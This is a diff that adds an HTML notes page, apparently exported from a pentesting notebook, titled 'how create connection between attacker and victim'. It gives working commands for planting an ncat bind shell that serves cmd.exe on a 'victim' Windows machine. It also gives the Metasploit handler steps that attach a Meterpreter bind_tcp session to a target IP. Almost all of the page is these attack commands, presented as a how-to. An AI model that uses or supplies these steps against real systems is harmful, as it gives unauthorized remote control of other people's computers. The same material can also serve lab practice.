@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>how create connection between attacker and victim</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>how create connection between attacker and victim</h1><br/><strong>Backdoor server (victim windows machine):<br /></strong>Download ncat for Windows from here: <a href="http://nmap.org/dist/ncat-portable-5.59BETA1.zip">http://nmap.org/dist/ncat-portable-5.59BETA1.zip</a><strong><br /></strong><div class="codebox"><div class="codebox">ncat&nbsp;-l&nbsp;-p&nbsp;5555&nbsp;-e&nbsp;%windir%\system32\cmd.exe</div></div><br /><a href=""><img src="images/850-1.png" alt="images/850-1.png" /></a><br /><br /><br /><strong>Meterpreter session with the attacker machine</strong><br /><div class="codebox"><div class="codebox">service&nbsp;postgresql&nbsp;start<br />msfconsole<br />use&nbsp;exploit/multi/handler<br />set&nbsp;PAYLOAD&nbsp;windows/meterpreter/bind_tcp<br />show&nbsp;options<br />set&nbsp;LPORT&nbsp;5555&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#port&nbsp;where&nbsp;the&nbsp;windows&nbsp;machine&nbsp;is&nbsp;listening<br />set&nbsp;RHOST&nbsp;192.168.1.120&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#target&nbsp;windows&nbsp;machine</div></div><br /><a href=""><img src="images/850-2.png" alt="images/850-2.png" /></a><br /></div>
+</body>
+</html>
